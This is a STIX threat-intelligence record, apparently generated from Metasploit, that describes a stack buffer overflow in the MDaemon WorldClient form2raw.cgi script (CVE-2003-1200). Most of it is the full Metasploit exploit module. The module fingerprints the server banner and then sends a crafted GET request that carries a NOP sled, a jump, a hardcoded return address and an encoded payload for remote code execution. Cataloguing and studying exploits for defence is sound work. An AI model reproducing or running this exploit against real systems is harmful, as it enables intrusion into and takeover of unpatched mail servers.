{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f3c2986-0a3a-41a9-ac69-c74fd96a4374",
    "created": "2024-08-14T16:52:02.357629Z",
    "modified": "2024-08-14T16:52:02.357633Z",
    "name": "MDaemon WorldClient form2raw.cgi Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Alt-N MDaemon SMTP server for versions 6.8.5 and earlier. When WorldClient HTTP server is installed (default) a CGI script is provided to accept html FORM based emails and deliver via MDaemon.exe by writing the CGI output to the Raw Queue. When X-FromCheck is enabled (also default) the temporary form2raw.cgi data is copied by MDaemon.exe and a stack based overflow occurs when an excessively long From field is specified. The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes. Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait.  Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very reliable). Once the payload is written into the Raw Queue by Form2Raw, MDaemon will continue to crash/execute the payload until the CGI output is manually deleted from the queue in C:\\MDaemon\\RawFiles\\*.raw. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/mdaemon_worldclient_form2raw.rb",
            "external_id": "mdaemon_worldclient_form2raw.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-1200"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'MDaemon WorldClient form2raw.cgi Stack Buffer Overflow',\n      'Description'\t=> %q{\n      This module exploits a stack buffer overflow in Alt-N MDaemon SMTP server for\n      versions 6.8.5 and earlier. When WorldClient HTTP server is installed (default),\n      a CGI script is provided to accept html FORM based emails and deliver via MDaemon.exe,\n      by writing the CGI output to the Raw Queue. When X-FromCheck is enabled (also default),\n      the temporary form2raw.cgi data is copied by MDaemon.exe and a stack based\n      overflow occurs when an excessively long From field is specified.\n      The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes.\n      Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait.\n\n      Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very\n      reliable). Once the payload is written into the Raw Queue by Form2Raw, MDaemon will\n      continue to crash/execute the payload until the CGI output is manually deleted\n      from the queue in C:\\MDaemon\\RawFiles\\*.raw.\n      },\n      'Author' \t=> [ 'aushack' ],\n      'Arch'\t\t=> [ ARCH_X86 ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n      [\n        [ 'CVE', '2003-1200' ],\n        [ 'OSVDB', '3255' ],\n        [ 'BID', '9317' ],\n      ],\n      'Privileged'\t\t=> true,\n      'DefaultOptions'\t=>\n      {\n        'EXITFUNC'\t=> 'thread',\n      },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t=> 900,\n          'BadChars' \t\t=> \"\\x00\\x0a\\x0d%\\x20@<>&?|,;=`()${}\\#!~\\\"\\xff\\/\\\\\",\n          'StackAdjustment' \t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n      [\n        # Aushack - Tested OK-ish 20090702 w2k\n        [ 'Universal MDaemon.exe', \t{ 'Ret' => 0x022fcd46 } ], # direct memory jump :(\n        [ 'Debugging test',\t\t{ 'Ret' => 0x44434241 } ],\n      ],\n      'DisclosureDate' => '2003-12-29',\n      'DefaultTarget' => 0))\n\n      register_options(\n      [\n        Opt::RPORT(3000),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    banner = sock.get_once\n    disconnect\n\n    if (banner.to_s =~ /WDaemon\\/6\\.8\\.[0-5]/)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    sploit = \"GET /form2raw.cgi?From=\" # Trigger vuln\n    sploit << \"\\x90\" * 242 # We set EIP to the middle of this.\n    sploit << Rex::Arch::X86.jmp_short(61) # Then jump over some junk memory.. 60 is precise but is a badchar.\n    sploit << [target['Ret']].pack('V') + \"c\" # Return address, plus 1 byte overwrite for ESP... 'c'\n    sploit << \"&To=#{Rex::Text.rand_text_alpha(12)}@#{Rex::Text.rand_text_alpha(12)}.#{Rex::Text.rand_text_alpha(3)}\"\n    sploit << \"&Body=\" + \"\\x90\" * 1 # 1 Byte for short jump.\n    sploit << payload.encoded + \" HTTP/1.0\"\n\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n    res = sock.get_once(-1, 3)\n\n    if (res =~ /Message spooled but will be deleted if not FROM a valid account/)\n      print_status(\"Payload accepted by WorldClient Form2Raw CGI!\")\n      print_status(\"Wait for the Raw Queue to be processed (1 to 60 minutes).\")\n    else\n      print_status(\"Message not accepted. Vulnerable target?\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-12-29",
    "x_mitre_platforms": [
        "['win']"
    ]
}